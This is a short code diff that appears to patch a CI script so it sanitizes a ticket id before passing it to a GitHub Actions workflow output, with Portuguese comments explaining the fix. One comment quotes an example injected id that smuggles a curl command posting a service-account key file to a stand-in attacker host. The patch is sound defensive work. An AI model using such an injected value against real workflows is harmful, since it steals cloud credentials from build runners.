@@ -85,7 +85,18 @@ const md = [
 fs.writeFileSync('.ci-ticket.md', md, 'utf8');
 
 setOut('has_ticket', 'true');
-setOut('ticket_id', t.id);
+// [02/08/2026] SANITIZA NA ORIGEM. O id vem do array `manutencao` em azuos/shared,
+// gravavel por qualquer usuario autorizado, e era interpolado direto num `run:` do
+// workflow — um id como `a"; curl -d @service-account.json https://evil.tld; #`
+// virava shell arbitrario no runner, com a chave do Firebase no disco.
+// Alem disso, \n cru permitiria injetar outputs falsos no GITHUB_OUTPUT.
+const idSeguro = String(t.id || '').replace(/[^A-Za-z0-9_-]/g, '').slice(0, 64);
+if (!idSeguro) {
+  console.log('Chamado com id fora do padrao — ignorado por seguranca:', JSON.stringify(t.id).slice(0, 80));
+  setOut('has_ticket', 'false');
+  process.exit(0);
+}
+setOut('ticket_id', idSeguro);
 setOut('ticket_titulo', String(t.titulo || 'chamado').replace(/[\r\n]+/g, ' ').slice(0, 120));
 console.log('Chamado selecionado:', t.id, '-', t.titulo);
 
